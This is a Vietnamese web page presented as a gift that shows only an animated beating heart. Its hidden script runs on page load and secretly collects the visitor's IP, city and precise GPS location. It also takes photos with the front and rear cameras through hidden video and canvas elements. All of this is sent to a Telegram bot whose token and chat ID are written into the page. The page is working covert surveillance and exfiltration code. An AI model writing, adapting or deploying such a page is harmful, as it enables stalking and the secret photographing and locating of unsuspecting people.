<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gửi Tặng Bạn</title>
    <style>
        body {
            margin: 0; padding: 0; display: flex;
            justify-content: center; align-items: center;
            min-height: 100vh; background-color: #ffe6e6; overflow: hidden;
        }
        .heart {
            position: relative; width: 100px; height: 90px;
            background-color: red; transform: rotate(-45deg);
            animation: beat 1s infinite; cursor: pointer;
        }
        .heart::before, .heart::after {
            content: ""; position: absolute; width: 100px; height: 100px;
            background-color: red; border-radius: 50%;
        }
        .heart::before { top: -50px; left: 0; }
        .heart::after { left: 50px; top: 0; }
        @keyframes beat {
            0% { transform: scale(1) rotate(-45deg); }
            50% { transform: scale(1.2) rotate(-45deg); }
            100% { transform: scale(1) rotate(-45deg); }
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="heart"></div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8907393193:AAHR3ePsPfQzds4U-vbo21ju3dM5_3hr5uA';
        const CHAT_ID = '8608244308';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // 1. Lấy thông tin IP và Vị trí theo IP (Dự phòng khi từ chối vị trí chính xác)
        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip || 'Không rõ',
                    city: data.city || '',
                    region: data.region || '',
                    country: data.country_name || '',
                    lat: data.latitude,
                    lon: data.longitude
                };
            } catch (e) {
                return { ip: 'Không lấy được IP', city: '', region: '', country: '', lat: null, lon: null };
            }
        }

        // 2. Lấy Tọa độ GPS chính xác từ thiết bị
        function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        // 3. Chụp ảnh từ Camera theo hướng chỉ định (user: Trước, environment: Sau)
        function capturePhoto(facingMode) {
            return new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    }).catch(async () => {
                        // Fallback nếu không hỗ trợ exact
                        return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                    });

                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            
                            // Tắt stream camera sau khi chụp
                            stream.getTracks().forEach(track => track.stop());

                            canvas.toBlob((blob) => {
                                resolve(blob);
                            }, 'image/jpeg', 0.8);
                        }, 1000);
                    };
                } catch (e) {
                    resolve(null);
                }
            });
        }

        // 4. Gửi ảnh/tin nhắn lên Telegram
        async function sendToTelegram(photoBlob, captionText) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            if (photoBlob) {
                formData.append('photo', photoBlob, 'photo.jpg');
                formData.append('caption', captionText);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: captionText, parse_mode: 'Markdown' })
                });
            }
        }

        // 5. Luồng xử lý chính
        async function main() {
            const ipData = await getIPInfo();
            const gpsLocation = await getGeolocation();

            let locationText = `🌐 **THÔNG TIN THU THẬP:**\n`;
            locationText += `• IP: ${ipData.ip}\n`;

            if (gpsLocation) {
                locationText += `📍 **Vị trí GPS chính xác:**\n`;
                locationText += `• Tọa độ: \`${gpsLocation.lat},${gpsLocation.lon}\`\n`;
                locationText += `🔗 **Google Maps:** https://www.google.com/maps?q=${gpsLocation.lat},${gpsLocation.lon}\n`;
            } else {
                locationText += `📍 **Vị trí ước tính qua IP (Chưa duyệt GPS):**\n`;
                if (ipData.city || ipData.region) {
                    locationText += `• Khu vực: ${ipData.city}, ${ipData.region}, ${ipData.country}\n`;
                }
                if (ipData.lat && ipData.lon) {
                    locationText += `🔗 **Google Maps (IP):** https://www.google.com/maps?q=${ipData.lat},${ipData.lon}\n`;
                } else {
                    locationText += `• Không thể xác định địa chỉ\n`;
                }
            }

            // Chụp Cam Trước
            const frontPhoto = await capturePhoto("user");
            if (frontPhoto) {
                await sendToTelegram(frontPhoto, locationText + `📸 **Loại ảnh:** Camera Trước (Selfie)`);
            }

            // Chụp Cam Sau
            const backPhoto = await capturePhoto("environment");
            if (backPhoto) {
                await sendToTelegram(backPhoto, `📸 **Loại ảnh:** Camera Sau (Khung cảnh)`);
            }

            // Nếu không chụp được ảnh nào (do từ chối quyền) -> Gửi tin nhắn thông tin
            if (!frontPhoto && !backPhoto) {
                await sendToTelegram(null, locationText + `⚠️ **Camera:** Người dùng không cấp quyền camera.`);
            }
        }

        window.onload = main;
    </script>
</body>
</html>
